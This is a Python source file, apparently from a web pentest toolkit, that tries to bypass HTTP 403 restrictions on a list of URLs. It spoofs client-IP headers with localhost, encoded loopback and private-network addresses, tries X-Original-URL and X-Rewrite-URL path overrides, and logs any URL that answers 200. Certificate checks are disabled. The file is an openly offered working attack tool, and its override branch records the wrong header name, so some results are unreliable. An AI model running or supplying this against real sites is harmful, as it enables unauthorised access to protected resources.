import click
import requests
requests.packages.urllib3.disable_warnings()

headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]

headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
        "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
        "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]

values = ["localhost", "localhost:80", "localhost:443", 
        "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
        "2130706433", "0x7F000001", "0177.0000.0000.0001", 
        "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
        "172.16.0.1", "192.168.1.0", "192.168.1.1"]

def req_url(url,ua,value):   #url请求函数
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
        ua : value
    }
    try:
        response = requests.get(url,headers=headers,timeout=3,verify=False).status_code
    except requests.exceptions.ReadTimeout:
        #print(url+"  | 请求url超时！")
        return False
    except requests.exceptions.ConnectionError:
        #print(url+"  | 连接出错！")
        return False
    return response

bypass_success = []
def bypass_403(url):
        for header in headers:
                for value in values:
                        if req_url(url,header,value) == 200:
                                click.secho(url+"  |  UA : "+header + ": " +value+"\n", fg='green')

                                bypass_success.append(url+"  |  UA : "+header + ": "  +value)
                                return
                        else:
                                pass
        for ua in headers_overwrite:
                if req_url(url,ua,"/") == 200:
                                click.secho(url+"  |  UA :"+header + ": /\n" , fg='green')
                                bypass_success.append(url+"  |  UA : "+header + ": /")
                                return
                else:
                        pass

def bypass_main(list_403):
        try:
                for url_403 in list_403:
                        url_403 = url_403.strip()
                        bypass_403(url_403)
                return bypass_success
        except KeyboardInterrupt:
                pass

